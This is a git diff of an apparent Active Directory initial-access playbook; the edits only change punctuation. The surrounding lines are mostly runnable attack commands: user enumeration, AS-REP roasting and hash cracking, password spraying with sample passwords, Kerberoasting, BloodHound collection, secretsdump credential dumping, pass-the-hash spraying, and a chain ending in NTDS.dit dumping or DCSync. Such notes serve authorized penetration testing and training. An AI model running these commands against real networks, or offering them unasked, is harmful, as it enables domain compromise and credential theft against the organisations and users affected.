@@ -4,7 +4,7 @@ Standard initial access techniques for Active Directory environments. These work
 
 ---
 
-## Step 1 — Enumerate Users First
+## Step 1 - Enumerate Users First
 
 You need usernames before you can do anything credential-based.
 
@@ -13,19 +13,19 @@ You need usernames before you can do anything credential-based.
 nxc smb <DC-IP> -u '' -p '' --rid-brute
 nxc smb <DC-IP> -u 'guest' -p '' --rid-brute
 
-# Kerbrute — enumerate valid usernames via Kerberos (no lockout risk)
+# Kerbrute - enumerate valid usernames via Kerberos (no lockout risk)
 kerbrute userenum --dc <DC-IP> -d corp.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 
 # LDAP anonymous (if allowed)
 ldapsearch -H ldap://<DC-IP> -x -b "dc=corp,dc=local" "(objectClass=user)" sAMAccountName
 
-# enum4linux — pulls users if null session works
+# enum4linux - pulls users if null session works
 enum4linux -a <DC-IP>
 ```
 
 ---
 
-## Step 2 — AS-REP Roasting (No Creds Needed)
+## Step 2 - AS-REP Roasting (No Creds Needed)
 
 Targets accounts with "Do not require Kerberos preauthentication." You only need a username list.
 
@@ -37,11 +37,11 @@ GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip <DC-IP> -format hashcat -n
 hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
 ```
 
-If cracked → you now have valid domain credentials → move to Step 4.
+If cracked -> you now have valid domain credentials -> move to Step 4.
 
 ---
 
-## Step 3 — Password Spraying
+## Step 3 - Password Spraying
 
 Use discovered usernames + common password patterns. **Check lockout policy first.**
 
@@ -50,7 +50,7 @@ Use discovered usernames + common password patterns. **Check lockout policy firs
 nxc smb <DC-IP> -u '' -p '' --pass-pol
 crackmapexec smb <DC-IP> --pass-pol
 
-# Spray — slow and careful (1 attempt per user, then wait)
+# Spray - slow and careful (1 attempt per user, then wait)
 kerbrute passwordspray --dc <DC-IP> -d corp.local users.txt 'Password2024!'
 kerbrute passwordspray --dc <DC-IP> -d corp.local users.txt 'Welcome1'
 
@@ -69,7 +69,7 @@ Months:        January2024!, February2024!
 
 ---
 
-## Step 4 — With Valid Credentials, Enumerate Everything
+## Step 4 - With Valid Credentials, Enumerate Everything
 
 ```sh
 # Check what you can access
@@ -81,20 +81,20 @@ nxc rdp <cidr> -u user -p pass                         # RDP access?
 # BloodHound collection
 bloodhound-python -d corp.local -u user -p pass -ns <DC-IP> -c all
 
-# Kerberoasting — needs any valid domain user
+# Kerberoasting - needs any valid domain user
 GetUserSPNs.py corp.local/user:pass -dc-ip <DC-IP> -request
 ```
 
 ---
 
-## Step 5 — Exploit What You Find
+## Step 5 - Exploit What You Find
 
 | BloodHound shows | Attack |
 |---|---|
-| You have local admin on a machine | PTH → shell → dump creds |
-| Kerberoastable users | Crack TGS → more creds |
+| You have local admin on a machine | PTH -> shell -> dump creds |
+| Kerberoastable users | Crack TGS -> more creds |
 | AS-REP roastable users | Already done in Step 2 |
-| GenericAll/WriteDACL path | ACL abuse → password reset → escalate |
+| GenericAll/WriteDACL path | ACL abuse -> password reset -> escalate |
 | Unconstrained delegation machine | [Delegation Attacks](../post-compromise/delegation-attacks.md) |
 
 ---
@@ -109,7 +109,7 @@ secretsdump.py ./admin:<pass>@<ip>
 # Spray those creds across the network
 nxc smb <cidr> -u admin -H <hash> --local-auth
 
-# If domain user cached — run BloodHound
+# If domain user cached - run BloodHound
 bloodhound-python -d corp.local -u user -p pass -ns <DC-IP> -c all
 ```
 
@@ -119,14 +119,14 @@ bloodhound-python -d corp.local -u user -p pass -ns <DC-IP> -c all
 
 ```
 Enumerate users (RID brute / kerbrute)
-    ↓
-AS-REP roast → crack hash → domain user
+    v
+AS-REP roast -> crack hash -> domain user
     OR
-Password spray → domain user
-    ↓
+Password spray -> domain user
+    v
 BloodHound + Kerberoast
-    ↓
+    v
 Find path to DA (ACL abuse / local admin chain / delegation)
-    ↓
+    v
 Dump NTDS.dit / DCSync
 ```
